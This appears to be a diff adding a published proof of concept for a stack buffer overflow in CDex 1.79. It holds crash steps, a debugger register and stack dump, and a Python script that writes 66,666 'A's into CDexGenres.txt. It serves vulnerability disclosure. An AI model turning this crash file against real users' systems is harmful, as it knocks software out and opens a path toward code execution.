@@ -1,0 +1,53 @@
+'''
+********************************************************************************************
+# Exploit Title: CDex Genre Stack Buffer Overflow
+# Date: 10/9/2015
+# Exploit Author: Un_N0n
+# Software Link: http://cdex.mu/download
+# Version: 1.79
+# Tested on: Windows 7 x86(32 BIT)
+********************************************************************************************
+[Steps to Produce the Crash]:
+1- Generate a File by python code mentioned below.
+2- Goto C:\Users\YourUsername\AppData\Local\CDex\LocalCDDB
+3- Replace the Old CDexGenres.txt with New CDexGenres.txt which is 
+   Produced by Python Code.
+4- Open Up CDex.exe.
+~Software will crash.
+
+On Further Analysis, We come to know that it is Stack-based-BOF.
+
+[REG-DUMP]:
+EAX 00000000
+ECX 779DD018 ASCII "\r\nSTATUS_STACK_BUFFER_OVERRUN encountered\r\n" //May be handled but yet application crashes.
+EDX 0012F1A1 ASCII 0A,"STATUS_STA"
+EBX 00749338 CDex.00749338
+ESP 0012F3E8
+EBP 0012F464
+ESI 00000000
+EDI 002C7AC8
+
+EIP 779DCE96 kernel32.779DCE96
+
+0012F3F4   002C7AC8
+0012F3F8   002E25F8  ASCII "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>
+0012F3FC   002E5FD8
+0012F400   002E44A0
+0012F404   000003F8
+0012F408   0000007F
+0012F40C   0012F504
+0012F410   00260000
+0012F414   77C97B89  RETURN to ntdll.77C97B89 from ntdll.RtlFillMemoryUlong
+0012F418   002E2580  ASCII "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>
+0012F41C   00001190
+'''
+
+[Code to produce CDexGenres.txt]
+buffer = "A"*66666
+file = "CDexGenres.txt"
+f = open(file,'w')
+f.write(buffer)
+f.close()
+'''
+**********************************************************************************************
+'''
